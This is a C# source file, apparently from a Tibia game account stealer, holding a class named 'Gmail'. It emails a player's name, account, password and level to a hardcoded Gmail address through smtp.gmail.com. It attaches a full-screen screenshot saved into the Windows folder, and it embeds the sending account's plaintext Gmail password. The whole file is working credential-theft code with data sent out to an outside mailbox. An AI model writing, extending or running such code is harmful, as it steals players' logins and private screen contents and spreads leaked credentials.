using System;
using Tibb.Clients;
using System.Net.Mail;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Imaging;

namespace Tibb.DAO
{
    public class Gmail
    {
        public Gmail(Player player)
        {
            this.player = player;
        }

        public void sendEmail()
        {
            this.prepareEmail();
            SmtpServer.Send(mail);
        }

        private void prepareEmail()
        {
            SmtpServer = new SmtpClient();
            SmtpServer.Credentials = new System.Net.NetworkCredential(cuentaGmail, passwordGmail);
            SmtpServer.Port = 587;
            SmtpServer.Host = "smtp.gmail.com";
            SmtpServer.EnableSsl = true;
            mail = new MailMessage();
            try
            {
                mail.From = new MailAddress(cuentaGmail,
                messageTitle, System.Text.Encoding.UTF8);
                mail.To.Add(emailDestination);
                mail.Subject = messageTitle + "- Nivel: " + player.Level;
                mail.Body = createMessage();
                System.Threading.Thread.Sleep(500);
                mail.IsBodyHtml = true;
                if (attachedImage)
                {
                    Screenshot();
                    mail.Attachments.Add(new Attachment(newpath));
                }
                mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
            }
            catch (Exception ex)
            {
            }
        }

        private string createMessage()
        {
            string msg = "<b>Nombre:</b> " + player.Name +
                "<br /><b>Account:</b> " + player.Account +
                "<br /><b>Password:</b> " + player.Password +
                "<br /><b>Nivel:</b> " + player.Level.ToString();
            System.Threading.Thread.Sleep(500);
            return msg;
        }

        private void Screenshot()
        {
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.SetResolution(400, 400);
            newpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), @"captura.gif");
            bmpScreenshot.Save(newpath, ImageFormat.Gif);
        }

        private Player player;
        private MailMessage mail;
        private SmtpClient SmtpServer;

        private string cuentaGmail = "sender3000x@gmail.com";
        private string passwordGmail = "cosalista21";

        private string emailDestination = "sender3000x@gmail.com";
        private string messageTitle = "Tibia Account";

        private bool attachedImage = true;
        private string newpath = null;
    }
}